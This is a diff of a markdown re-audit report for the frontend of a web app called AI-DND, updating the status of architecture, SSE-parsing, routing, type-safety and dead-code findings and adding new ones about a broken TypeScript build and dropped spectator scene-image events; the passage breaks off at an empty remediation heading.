 - **Location**: [`src/shared/lib/api-client.ts:2-3`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/shared/lib/api-client.ts#L2-L3) and [`src/features/auth/api/auth.api.ts:1`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/auth/api/auth.api.ts#L1)
-- **Problem & Root Cause**:
-  `CLAUDE.md:140` dictates: *"`shared/` contains no feature-specific logic."*
-  `shared/lib/api-client.ts` directly imports `useAuthStore` from `@/features/auth/stores/auth.store` and `refreshAccessToken` from `@/features/auth/api/auth.api`. Simultaneously, `auth.api.ts` imports `apiClient` from `@/shared/lib/api-client`.
-  This creates a tight circular dependency between `shared` and `features/auth`.
-- **Remediation**:
-  Invert dependency injection: allow `apiClient` to accept token-getter and refresh callbacks registered at application initialization (e.g. in `main.tsx` or `AuthProvider.tsx`), keeping `shared/lib/api-client.ts` completely agnostic of `features/auth`.
+- **Re-Audit Verification**: **STILL ACTIVE**
+- **Current Code State**:
+  `api-client.ts` directly imports `useAuthStore` and `refreshAccessToken`, while `auth.api.ts` imports `apiClient`. Violates `CLAUDE.md:140` ("`shared/` contains no feature-specific logic").
 
 ---
 
-### [MED-02] Cross-Feature Import Boundary Violations (`features/play` importing `features/studio`)
+### [MED-02] [ACTIVE] Cross-Feature Import Boundary Violations
 - **Severity**: Medium (P2)
 - **Category**: Architecture Boundary Violation
-- **Location**: [`src/features/play/types/scenario.ts:1`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/types/scenario.ts#L1) and [`src/features/play/components/ScenarioFocus/ScenarioSetupPreview.tsx:2`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/components/ScenarioFocus/ScenarioSetupPreview.tsx#L2)
-- **Problem & Root Cause**:
-  `CLAUDE.md:139` states: *"`features/` never import from each other. `studio/` never imports from `play/` and vice versa. Cross-feature shared code goes into `shared/` first."*
-  `features/play` directly imports `SetupInputField` from `@/features/studio/stores/studio.store`. Furthermore, `features/profile` imports components, API methods, and types from `@/features/play` and `@/features/auth`.
-- **Remediation**:
-  Extract `SetupInputField`, `Scenario`, and common genre/scenario types into `src/shared/types/scenario.types.ts` and update imports.
+- **Location**: [`src/features/play/types/scenario.ts:1`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/types/scenario.ts#L1)
+- **Re-Audit Verification**: **STILL ACTIVE**
+- **Current Code State**:
+  `features/play` imports `SetupInputField` directly from `@/features/studio/stores/studio.store`. Violates `CLAUDE.md:139` ("features never import from sibling features").
 
 ---
 
-### [MED-03] Premature Whitespace Trimming in SSE Stream Frame Parser
+### [MED-03] [ACTIVE] Premature Whitespace Trimming in SSE Stream Frame Parser
 - **Severity**: Medium (P2)
 - **Category**: Concurrency & SSE Formatting
-- **Location**: [`src/shared/lib/sse-client.ts:166`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/shared/lib/sse-client.ts#L166)
-- **Problem & Root Cause**:
-  In `parseSSEFrame`:
-  ```typescript
-  else if (line.startsWith("data:")) dataLines.push(line.slice(5).trim());
-  ```
-  Per the W3C SSE standard, only a single leading space after `data:` is stripped (`data: hello` → `"hello"`). Calling `.trim()` strips all leading and trailing whitespace.
-- **Failure Scenario / Impact**:
-  When Gemini streams tokens like `" "` (space between words) or code/markdown indentation, `.trim()` strips them, causing concatenated words (`"Hello"` + `" "` + `"world"` becomes `"Helloworld"`) or corrupting preformatted ASCII/markdown tables.
-- **Remediation**:
-  Replace `.trim()` with standard single-leading-space stripping:
-  ```typescript
-  else if (line.startsWith("data:")) {
-    const rawData = line.slice(5);
-    dataLines.push(rawData.startsWith(" ") ? rawData.slice(1) : rawData);
-  }
-  ```
+- **Location**: [`src/shared/lib/sse-client.ts:245`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/shared/lib/sse-client.ts#L245)
+- **Re-Audit Verification**: **STILL ACTIVE**
+- **Current Code State**:
+  `else if (line.startsWith("data:")) dataLines.push(line.slice(5).trim());` remains active, stripping leading and trailing spaces from streamed narration tokens.
 
 ---
 
-### [MED-04] CR-LF Chunk Boundary Splitting Bug in SSE Reader
+### [MED-04] [ACTIVE] CR-LF Chunk Boundary Splitting Bug in SSE Reader
 - **Severity**: Medium (P2)
 - **Category**: Concurrency & Network Edge Case
-- **Location**: [`src/shared/lib/sse-client.ts:145`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/shared/lib/sse-client.ts#L145)
-- **Problem & Root Cause**:
-  ```typescript
-  buffer += decoder.decode(value, { stream: true }).replace(/\r\n/g, "\n");
-  ```
-  If a network chunk boundary splits between `\r` and `\n`, `replace(/\r\n/g, "\n")` fails to match. The trailing `\r` remains in `buffer`. When the next chunk prepends `\n`, the string contains an unnormalized `\r\n` that prevents `buffer.split("\n\n")` from recognizing frame boundaries.
-- **Remediation**:
-  Perform `replace(/\r\n/g, "\n")` on the entire accumulated buffer before splitting frames, or normalize CRLF within `consumeSSEFrames`.
+- **Location**: [`src/shared/lib/sse-client.ts:224`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/shared/lib/sse-client.ts#L224)
+- **Re-Audit Verification**: **STILL ACTIVE**
+- **Current Code State**:
+  `buffer += decoder.decode(value, { stream: true }).replace(/\r\n/g, "\n");` replaces CRLF only within the incoming slice; split `\r` and `\n` across chunk boundaries escape normalization.
 
 ---
 
-### [MED-05] Unguarded `loginAsDevUser` Export in Production Bundle
+### [MED-05] [ACTIVE] Unguarded `loginAsDevUser` Export in Production Bundle
 - **Severity**: Medium (P2)
 - **Category**: Security Vulnerability
-- **Location**: [`src/features/auth/hooks/useAuth.ts:31-40, 55`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/auth/hooks/useAuth.ts#L31-L40)
-- **Problem & Root Cause**:
-  `loginAsDevUser` is exported from `useAuth` unconditionally without checking `import.meta.env.DEV`.
-- **Failure Scenario / Impact**:
-  In a production build or staging deployment, any user or script in the browser console can call `loginAsDevUser()`, attempting to authenticate using the hardcoded `"mock-dev-token"`.
-- **Remediation**:
-  Guard `loginAsDevUser` with `import.meta.env.DEV`, or omit it entirely in production bundles:
-  ```typescript
-  const loginAsDevUser = async () => {
-    if (!import.meta.env.DEV) {
-      throw new Error("Dev login is only available in development mode.");
-    }
-    ...
-  ```
+- **Location**: [`src/features/auth/hooks/useAuth.ts:31-40`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/auth/hooks/useAuth.ts#L31-L40)
+- **Re-Audit Verification**: **STILL ACTIVE**
+- **Current Code State**:
+  `loginAsDevUser` is exported without guarding `if (!import.meta.env.DEV)`.
 
 ---
 
-### [MED-06] Invariant / Condition Grammar Operator Precedence Mismatch
+### [MED-06] [RESOLVED] Invariant / Condition Grammar Operator Precedence Mismatch
 - **Severity**: Medium (P2)
 - **Category**: Logic & Backend Contract Mismatch
-- **Location**: [`src/features/studio/components/ConditionEditor/ExpressionBuilder/ExpressionBuilder.tsx:97-109`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/studio/components/ConditionEditor/ExpressionBuilder/ExpressionBuilder.tsx#L97-L109) and [`apps/turn-resolution-service/app/turn/expression_evaluator.py:11-12, 45-54`](file:///home/aryan-sherigar/projects/AI-DND/apps/turn-resolution-service/app/turn/expression_evaluator.py#L11-L12)
-- **Problem & Root Cause**:
-  `ExpressionBuilder` allows creators to attach `AND`, `OR`, and `NOT` clauses to the exact same node concurrently.
-  However, TRS expression grammar specifies:
-  *"A node's own (field, op, value) leaf combines with at most one of AND/OR/NOT per level — this is a simple chained grammar, not a general boolean parser."*
-- **Failure Scenario / Impact**:
-  TRS evaluates connectives in dictionary key order (`AND` first, then `OR`), ignoring standard boolean algebraic precedence. Creators configuring complex conditional logic in the Studio see conditions evaluate unexpectedly in gameplay.
-- **Remediation**:
-  Restrict `ExpressionBuilder` to allow at most one connective (`AND` or `OR`) per expression level, or enforce explicit nested groupings.
+- **Location**: [`src/features/studio/components/ConditionEditor/ExpressionBuilder/ExpressionBuilder.tsx:46, 99-113`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/studio/components/ConditionEditor/ExpressionBuilder/ExpressionBuilder.tsx#L46)
+- **Re-Audit Verification**: **RESOLVED**
+- **Resolution Details**:
+  `ExpressionBuilder` now evaluates `const activeConnective = CLAUSE_KINDS.find((kind) => Boolean(value?.[kind]));` and only displays clause addition buttons when `!activeConnective`. Creators cannot attach conflicting `AND`, `OR`, and `NOT` clauses to the same node level concurrently.
 
 ---
 
-### [MED-07] Unprotected Studio & User Profile Routes in Router
+### [MED-07] [ACTIVE] Unprotected Studio & User Profile Routes in Router
 - **Severity**: Medium (P2)
 - **Category**: Authentication & Route Security
-- **Location**: [`src/app/router.tsx:53-72`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/app/router.tsx#L53-L72) and [`src/features/auth/components/AuthGuard/AuthGuard.tsx`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/auth/components/AuthGuard/AuthGuard.tsx)
-- **Problem & Root Cause**:
-  Routes `/studio`, `/studio/new`, `/studio/:id/edit`, and `/profile` are defined without wrapping in `<AuthGuard>`. `AuthGuard.tsx` was created but has 0 references in the entire application.
-- **Failure Scenario / Impact**:
-  Unauthenticated visitors can navigate directly to authoring or profile pages, triggering cascading 401 errors from backend endpoints.
-- **Remediation**:
-  Wrap all protected routes in `<AuthGuard>` within `router.tsx`.
+- **Location**: [`src/app/router.tsx:25-28, 37-38`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/app/router.tsx#L25-L28)
+- **Re-Audit Verification**: **STILL ACTIVE**
+- **Current Code State**:
+  Routes `/studio`, `/profile`, `/profile/:id`, `/studio/new`, and `/studio/:id/edit` are declared without `<AuthGuard>`.
 
 ---
 
-### [MED-08] Missing Query Invalidation on Scenario Publish and Duplicate
+### [MED-08] [ACTIVE] Missing Query Invalidation on Scenario Publish and Duplicate
 - **Severity**: Medium (P2)
 - **Category**: State Management & Cache Stagnation
-- **Location**: [`src/features/studio/hooks/usePublish.ts:15-22`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/studio/hooks/usePublish.ts#L15-L22) and [`src/features/studio/hooks/useDuplicateScenario.ts:5-18`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/studio/hooks/useDuplicateScenario.ts#L5-L18)
-- **Problem & Root Cause**:
-  Neither `usePublish` nor `useDuplicateScenario` invalidates the primary queries `["scenario", scenarioId]` or `["my-scenarios"]` upon success.
-- **Failure Scenario / Impact**:
-  After publishing or duplicating a scenario, returning to the Studio scenario list shows stale data (unlisted or unpublished statuses) until the user performs a hard refresh.
-- **Remediation**:
-  Add `queryClient.invalidateQueries({ queryKey: ["my-scenarios"] })` and `queryClient.invalidateQueries({ queryKey: ["scenario", scenarioId] })` to mutation `onSuccess` handlers.
+- **Location**: [`src/features/studio/hooks/usePublish.ts`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/studio/hooks/usePublish.ts) and [`src/features/studio/hooks/useDuplicateScenario.ts`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/studio/hooks/useDuplicateScenario.ts)
+- **Re-Audit Verification**: **STILL ACTIVE**
+- **Current Code State**:
+  Neither hook invalidates `["my-scenarios"]` or `["scenario", scenarioId]` upon successful mutation.
 
 ---
 
-### [MED-09] Animation vs. API Race Condition in `SetupPage`
+### [MED-09] [ACTIVE] Animation vs. API Race Condition in `SetupPage`
 - **Severity**: Medium (P2)
 - **Category**: Concurrency & Lifecycle
-- **Location**: [`src/features/play/pages/SetupPage.tsx:49-76`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/pages/SetupPage.tsx#L49-L76)
-- **Problem & Root Cause**:
-  `SetupPage` coordinates `DramaticSetupLoader` and `createPlaythroughMutation` through mutable refs (`playthroughIdRef`, `loaderFinishedRef`). If the API call fails or rejects while the animation is in-flight, `isLoadingOverlay` is set to false without cancelling the animation. If the user navigates away, the asynchronous callback attempts to update state on an unmounted component.
-- **Remediation**:
-  Cancel the animation on mutation error and track component mount state.
+- **Location**: [`src/features/play/pages/SetupPage.tsx:40-77`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/pages/SetupPage.tsx#L40-L77)
+- **Re-Audit Verification**: **STILL ACTIVE**
+- **Current Code State**:
+  `DramaticSetupLoader` animation does not receive a cancellation trigger if `createPlaythroughMutation` fails.
 
 ---
 
-### [MED-10] Ambient Audio State Transition Race Condition
+### [MED-10] [ACTIVE] Ambient Audio State Transition Race Condition
 - **Severity**: Medium (P2)
 - **Category**: Concurrency & Resource Leaks
-- **Location**: [`src/shared/lib/audio/ambient-soundtrack.ts:196-198, 206-212`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/shared/lib/audio/ambient-soundtrack.ts#L196-L198)
-- **Problem & Root Cause**:
-  `fadeChannelOut` relies on an uncancelled `setTimeout` to pause the outgoing audio element after 4 seconds. If `transitionTo` is called rapidly in succession (e.g. combat triggered right after tension), the audio element's `.src` is reassigned while `.play()` is pending, generating uncaught `AbortError` promise rejections.
-- **Remediation**:
-  Store active transition timeouts and cancel them on subsequent transitions; await or catch the `.play()` promise before re-assigning `.src`.
+- **Location**: [`src/shared/lib/audio/ambient-soundtrack.ts:230-233`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/shared/lib/audio/ambient-soundtrack.ts#L230-L233)
+- **Re-Audit Verification**: **STILL ACTIVE**
+- **Current Code State**:
+  `fadeChannelOut` schedules an uncancelled `setTimeout` to pause the outgoing audio element. In rapid consecutive transitions, the paused channel may have already been recycled as incoming.
 
 ---
 
 ## Severity 3: Low Severity, Dead Code & Monorepo Standards
 
-### [LOW-01] 19 Zero-Byte Abandoned Zombie Files in `src/`
+### [LOW-01] [PARTIALLY RESOLVED / ACTIVE] 15 Zero-Byte Abandoned Zombie Files in `src/`
 - **Severity**: Low / Cleanliness (P3)
 - **Category**: Dead Code
 - **Location**:
   1. [`src/shared/hooks/usePagination.ts`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/shared/hooks/usePagination.ts) (0 bytes)
   2. [`src/shared/hooks/useDebounce.ts`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/shared/hooks/useDebounce.ts) (0 bytes)
   3. [`src/shared/constants/predicates.ts`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/shared/constants/predicates.ts) (0 bytes)
-  4. [`src/shared/components/layout/AppShell.tsx`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/shared/components/layout/AppShell.tsx) (0 bytes)
-  5. [`src/shared/components/feedback/LoadingSpinner.tsx`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/shared/components/feedback/LoadingSpinner.tsx) (0 bytes)
-  6. [`src/shared/components/feedback/EmptyState.tsx`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/shared/components/feedback/EmptyState.tsx) (0 bytes)
-  7. [`src/shared/components/feedback/ErrorBoundary.tsx`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/shared/components/feedback/ErrorBoundary.tsx) (0 bytes)
-  8. [`src/shared/types/api.types.ts`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/shared/types/api.types.ts) (0 bytes)
-  9. [`src/shared/types/common.types.ts`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/shared/types/common.types.ts) (0 bytes)
-  10. [`src/features/play/components/PlayScreen/TurnIndicator.tsx`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/components/PlayScreen/TurnIndicator.tsx) (0 bytes)
-  11. [`src/features/play/components/DiscoveryFeed/FeedSortBar.tsx`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/components/DiscoveryFeed/FeedSortBar.tsx) (0 bytes)
-  12. [`src/features/play/components/DiscoveryFeed/DiscoveryFeed.tsx`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/components/DiscoveryFeed/DiscoveryFeed.tsx) (0 bytes)
-  13. [`src/features/play/components/DiscoveryFeed/FeedFilters.tsx`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/components/DiscoveryFeed/FeedFilters.tsx) (0 bytes)
-  14. [`src/features/play/components/SetupScreen/SetupField.tsx`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/components/SetupScreen/SetupField.tsx) (0 bytes)
-  15. [`src/features/play/components/SetupScreen/SetupScreen.tsx`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/components/SetupScreen/SetupScreen.tsx) (0 bytes)
-  16. [`src/features/play/types/turn.types.ts`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/types/turn.types.ts) (0 bytes)
-  17. [`src/features/play/types/participant.types.ts`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/types/participant.types.ts) (0 bytes)
-  18. [`src/features/play/types/playthrough.types.ts`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/types/playthrough.types.ts) (0 bytes)
-  19. [`src/features/play/api/ratings.api.ts`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/api/ratings.api.ts) (0 bytes)
-- **Problem & Root Cause**:
-  Similar to the 5 zombie files discovered in `core-api`, 19 zero-byte files exist in `src/`. If imported, they fail silently or break bundling.
-- **Remediation**:
-  Delete all 19 empty zombie files from the repository.
+  4. [`src/shared/types/api.types.ts`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/shared/types/api.types.ts) (0 bytes)
+  5. [`src/shared/types/common.types.ts`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/shared/types/common.types.ts) (0 bytes)
+  6. [`src/features/play/components/PlayScreen/TurnIndicator.tsx`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/components/PlayScreen/TurnIndicator.tsx) (0 bytes)
+  7. [`src/features/play/components/DiscoveryFeed/FeedSortBar.tsx`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/components/DiscoveryFeed/FeedSortBar.tsx) (0 bytes)
+  8. [`src/features/play/components/DiscoveryFeed/DiscoveryFeed.tsx`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/components/DiscoveryFeed/DiscoveryFeed.tsx) (0 bytes)
+  9. [`src/features/play/components/DiscoveryFeed/FeedFilters.tsx`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/components/DiscoveryFeed/FeedFilters.tsx) (0 bytes)
+  10. [`src/features/play/components/SetupScreen/SetupField.tsx`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/components/SetupScreen/SetupField.tsx) (0 bytes)
+  11. [`src/features/play/components/SetupScreen/SetupScreen.tsx`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/components/SetupScreen/SetupScreen.tsx) (0 bytes)
+  12. [`src/features/play/types/turn.types.ts`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/types/turn.types.ts) (0 bytes)
+  13. [`src/features/play/types/participant.types.ts`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/types/participant.types.ts) (0 bytes)
+  14. [`src/features/play/types/playthrough.types.ts`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/types/playthrough.types.ts) (0 bytes)
+  15. [`src/features/play/api/ratings.api.ts`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/api/ratings.api.ts) (0 bytes)
+- **Re-Audit Verification**: **PARTIALLY RESOLVED (15 REMAIN)**
+- **Details**:
+  4 files were resolved (`AppShell.tsx` and `ErrorBoundary.tsx` implemented; `LoadingSpinner.tsx` and `EmptyState.tsx` deleted). The 15 files listed above remain 0 bytes.
 
 ---
 
-### [LOW-02] Monolithic Initial Bundle: Zero Lazy-Loaded Routes in `router.tsx`
+### [LOW-02] [ACTIVE] Monolithic Initial Bundle: Zero Lazy-Loaded Routes in `router.tsx`
 - **Severity**: Low / Performance (P3)
 - **Category**: [CLAUDE.md](file:///home/aryan-sherigar/projects/AI-DND/CLAUDE.md) Violation
-- **Location**: [`src/app/router.tsx:1-15`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/app/router.tsx#L1-L15)
-- **Problem & Root Cause**:
-  `CLAUDE.md:197` mandates: *"Lazy load heavy routes. Use React.lazy + Suspense for Studio and Play pages — they should not be in the initial bundle."*
-  `router.tsx` statically imports every single page, bundling Pixi.js, the game loop, and the full Studio editor into the initial application download.
-- **Remediation**:
-  Convert all page components to `React.lazy(() => import(...))` with a top-level `<Suspense>` fallback.
+- **Location**: [`src/app/router.tsx:1-18`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/app/router.tsx#L1-L18)
+- **Re-Audit Verification**: **STILL ACTIVE**
+- **Current Code State**:
+  All 17 pages are statically imported at the top of `router.tsx`.
 
 ---
 
-### [LOW-03] 50 Functions Exceeding the 30-Line Limit
+### [LOW-03] [ACTIVE] Functions Exceeding the 30-Line Limit
 - **Severity**: Low / Code Cleanliness (P3)
 - **Category**: [CLAUDE.md](file:///home/aryan-sherigar/projects/AI-DND/CLAUDE.md) Violation
-- **Location**: e.g., [`LivingBookHero.tsx`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/landing/components/LivingBookHero.tsx) (293 lines), [`SetupStageCard.tsx`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/components/SetupScreen/SetupStageCard.tsx) (356 lines), [`useGameLoop.ts`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/components/MinigameOverlay/DodgeMinigame/useGameLoop.ts) (setup function: 139 lines).
-- **Problem & Root Cause**:
-  Violates `CLAUDE.md:37`: *"Functions under 30 lines. If a function is longer, it is doing more than one thing. Split it."*
-- **Remediation**:
-  Decompose large component render functions and lifecycle hooks into focused sub-components and helper utilities.
+- **Location**: e.g., [`SetupStageCard.tsx`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/components/SetupScreen/SetupStageCard.tsx) (442 lines), [`MoodSlotCard.tsx`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/studio/components/MusicSlotEditor/MoodSlotCard.tsx) (224 lines).
+- **Re-Audit Verification**: **STILL ACTIVE**
 
 ---
 
-### [LOW-04] 12 Explicit `any` Type Usages
-- **Severity**: Low / Type Safety (P3)
-- **Category**: [CLAUDE.md](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/CLAUDE.md) Violation
+### [LOW-04] [PARTIALLY RESOLVED / ACTIVE] Explicit `any` Type Usages
+- **Severity**: Low / Type Safety & Lint Gate (P3)
+- **Category**: [CLAUDE.md](file:///home/aryan-sherigar/projects/AI-DND/CLAUDE.md) Violation
 - **Location**:
   - `src/features/auth/hooks/useAuth.ts:26, 37`
+  - `src/features/play/pages/SetupPage.tsx:48, 60`
   - `src/features/studio/components/NewbieWizard/Step4Review.tsx:81, 112`
   - `src/features/studio/components/PublishFlow/PublishFlow.tsx:53`
-  - `src/features/play/components/SetupScreen/SetupStageCard.tsx:13, 17, 30, 35, 82`
-  - `src/features/play/pages/SetupPage.tsx:48, 60`
-- **Problem & Root Cause**:
-  Violates `CLAUDE.md:115`: *"No any. Use unknown and narrow with type guards, or define a proper interface."*
-- **Remediation**:
-  Replace `catch (err: any)` with `catch (err: unknown)` utilizing `extractErrorMessage(err)`, and define typed interfaces for setup schema fields.
+- **Re-Audit Verification**: **PARTIALLY RESOLVED (7 REMAIN)**
+- **Details**:
+  Reduced from 12 to 7 occurrences. The remaining 7 occurrences cause `npm run lint` to fail with exit code 1.
 
 ---
 
-### [LOW-05] 15+ Nested Ternary Expressions
+### [LOW-05] [ACTIVE] 15+ Nested Ternary Expressions
 - **Severity**: Low / Maintainability (P3)
 - **Category**: [CLAUDE.md](file:///home/aryan-sherigar/projects/AI-DND/CLAUDE.md) Violation
 - **Location**: e.g., [`src/shared/components/feedback/Toast.tsx:31`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/shared/components/feedback/Toast.tsx#L31)
-  ```typescript
-  <span>{type === "error" ? "⚠️" : type === "success" ? "✓" : "ℹ"}</span>
-  ```
-- **Problem & Root Cause**:
-  Violates `CLAUDE.md:39`: *"No nested ternaries. One ternary per expression maximum. Use if/else for anything more complex."*
-- **Remediation**:
-  Extract a lookup map or helper function:
-  ```typescript
-  const TOAST_ICONS: Record<string, string> = { error: "⚠️", success: "✓", info: "ℹ" };
-  <span>{TOAST_ICONS[type] ?? "ℹ"}</span>
-  ```
+- **Re-Audit Verification**: **STILL ACTIVE**
 
 ---
 
-### [LOW-06] Incomplete PixiJS v8 Canvas Teardown (`removeView` Missing)
+### [LOW-06] [ACTIVE] Incomplete PixiJS v8 Canvas Teardown (`removeView` Missing)
 - **Severity**: Low / Resource Hygiene (P3)
 - **Category**: Bug / Cleanup
-- **Location**: [`src/features/play/components/MinigameOverlay/DodgeMinigame/useGameLoop.ts:270`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/components/MinigameOverlay/DodgeMinigame/useGameLoop.ts#L270)
-- **Problem & Root Cause**:
-  In PixiJS v8, `app.destroy(true, { children: true })` does not detach the canvas from the DOM container unless `{ removeView: true }` is supplied in the destroy options.
-- **Remediation**:
-  Call `app.destroy({ removeView: true }, { children: true });` or explicitly invoke `app.canvas.remove()`.
+- **Location**: [`src/features/play/components/MinigameOverlay/DodgeMinigame/useGameLoop.ts:358`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/components/MinigameOverlay/DodgeMinigame/useGameLoop.ts#L358)
+- **Re-Audit Verification**: **STILL ACTIVE**
+- **Current Code State**:
+  Still passes boolean options: `app.destroy(true, { children: true })`. In PixiJS v8, canvas removal requires `{ removeView: true }`.
 
 ---
 
-### [LOW-07] Redundant Monolithic `firebase` Package Dependency
+### [LOW-07] [ACTIVE] Redundant Monolithic `firebase` Package Dependency
 - **Severity**: Low / Dependency Hygiene (P3)
 - **Category**: Tech Debt & Bundle Size
-- **Location**: [`apps/frontend/package.json:17, 18, 21`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/package.json#L17-L21)
+- **Location**: [`apps/frontend/package.json:26`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/package.json#L26)
+- **Re-Audit Verification**: **STILL ACTIVE**
+- **Current Code State**:
+  `"firebase": "^10.0.0"` remains in `dependencies`.
+
+---
+
+## Severity: New Findings (September 2026 Re-Audit)
+
+### [NEW-01] Broken TypeScript Compilation (`tsc --noEmit`) in `play.store.ts` via Missing `action_mode`
+- **Severity**: Critical (P0)
+- **Category**: Type Safety / Build Pipeline Blocker
+- **Location**: [`src/features/play/stores/play.store.ts:300-308, 370-377`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/stores/play.store.ts#L300-L308)
 - **Problem & Root Cause**:
-  `package.json` installs `@firebase/app`, `@firebase/auth`, AND monolithic `firebase`. Monolithic `firebase` pulls in unused dependencies (Firestore, Functions, Storage, Analytics) while `tsconfig.json` path-aliases redirect imports back to `@firebase/*`.
+  In `play.store.ts`, `TurnStreamBody` was modified to require `action_mode: ActionMode`:
+  ```typescript
+  interface TurnStreamBody {
+    playthrough_id: string;
+    participant_id: string;
+    action_text: string;
+    action_kind: "narrative" | "minigame_result";
+    action_mode: ActionMode;
+    minigame_result?: MinigameResultPayload;
+  }
+  ```
+  However, `submitMinigameResult` (line 300) and `retryMinigameResult` (line 371) call `_startTurnStream(...)` without supplying `action_mode`:
+  ```typescript
+  get()._startTurnStream(
+    {
+      playthrough_id: playthrough.playthrough_id,
+      participant_id: playthrough.participant_id,
+      action_text: MINIGAME_RESULT_ACTION_TEXT,
+      action_kind: "minigame_result",
+      minigame_result: payload,
+    },
+    MINIGAME_RESULT_ACTION_TEXT,
+  );
+  ```
+- **Impact**:
+  Running `npx tsc --noEmit` fails with two `TS2345: Argument of type ... is not assignable to parameter of type 'TurnStreamBody'` compiler errors. This causes `npm run build` (`tsc && vite build`) to fail completely.
 - **Remediation**:
-  Remove `"firebase": "^10.0.0"` from `package.json` dependencies and rely strictly on `@firebase/app` and `@firebase/auth`.
+  Make `action_mode` optional on `TurnStreamBody` (`action_mode?: ActionMode`) or provide a fallback (`action_mode: get().active_mode || "do"`) in both minigame submission calls.
+
+---
+
+### [NEW-02] Spectator Mode Drops Live `scene_image` SSE Broadcasts
+- **Severity**: High (P1)
+- **Category**: Concurrency & Feature Contract Mismatch
+- **Location**: [`src/features/play/hooks/useSpectator.ts:26-48`](file:///home/aryan-sherigar/projects/AI-DND/apps/frontend/src/features/play/hooks/useSpectator.ts#L26-L48) and [`apps/turn-resolution-service/app/turn/pipeline.py:227-230`](file:///home/aryan-sherigar/projects/AI-DND/apps/turn-resolution-service/app/turn/pipeline.py#L227-L230)
+- **Problem & Root Cause**:
+  In TRS `pipeline.py`, when a player performs a `"see"` action generating a scene image, TRS broadcasts a `"scene_image"` SSE event to spectators:
+  ```python
+  if scene_image:
+      if turn_request.action_mode == "see":
+          await state_writer.broadcast_spectator_event(
+              turn_request.playthrough_id, "scene_image", scene_image.image_url
+          )
+      yield response_streamer.scene_image_event(scene_image.image_url)
+  ```
+  In `useSpectator.ts`, the SSE `handleEvent` callback only handles `"mood"`, `"narration"`, and `"done"`. The event `"scene_image"` is completely ignored.
+- **Impact**:
+  Spectators watching a live playthrough never receive real-time generated scene images; images only appear if the spectator reloads the entire page after the turn commits.
+- **Remediation**:
